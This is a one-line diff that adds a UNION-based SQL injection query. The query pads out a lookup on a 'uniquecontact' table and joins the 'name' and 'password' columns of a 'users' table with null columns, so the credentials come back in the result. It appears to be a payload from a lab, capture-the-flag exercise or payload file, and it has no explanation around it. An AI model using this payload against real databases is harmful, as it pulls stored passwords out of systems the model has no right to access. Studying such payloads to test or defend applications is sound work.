@@ -1,0 +1,1 @@
+select * from uniquecontact where id=0 OR id=0 UNION select * from (select name from users) AS a JOIN (select password from users) as b JOIN (select null) as c JOIN (select null) as d JOIN (select null) as e JOIN (select null) as f JOIN (select null) as g;
